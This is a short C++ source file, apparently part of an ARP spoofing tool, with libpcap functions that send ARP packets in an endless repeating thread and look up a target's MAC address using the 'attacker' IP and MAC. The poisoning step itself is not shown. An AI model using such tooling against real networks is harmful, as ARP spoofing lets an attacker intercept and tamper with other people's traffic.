#include "spoof.h"

void sendArp(pcap_t *handle, EthArpPacket pkt)
{
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("\n----------------------------------------\n");
		printf("[*] Arp packet sending succeeded!");
		printf("\n----------------------------------------\n");
	}
}

void sendArpThread(pcap_t *handle, EthArpPacket pkt, int repeat)
{
	while(true)
	{
		sendArp(handle, pkt);
		sleep(repeat);
	}
}

Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
{
	EthArpPacket pkt = EthArpPacket(ArpHdr::Request, Mac::broadcastMac(), attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, attackerIp, Mac::nullMac(), ip);
	
	std::thread thread1(sendArpThread, handle, pkt, 3);
	
	while (true)
		{
			struct pcap_pkthdr *header;
			const u_char *reply_packet;
			int result = pcap_next_ex(handle, &header, &reply_packet);
			if (result != 1)
			{
				continue;
			}
			EthArpPacket *reply = (EthArpPacket *)reply_packet;

			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
				reply->arp_.sip_ == Ip(htonl(ip)) && reply->arp_.tip_ == Ip(htonl(attackerIp)))
			{
				thread1.detach();
				return reply->arp_.smac_;
			}
		}
}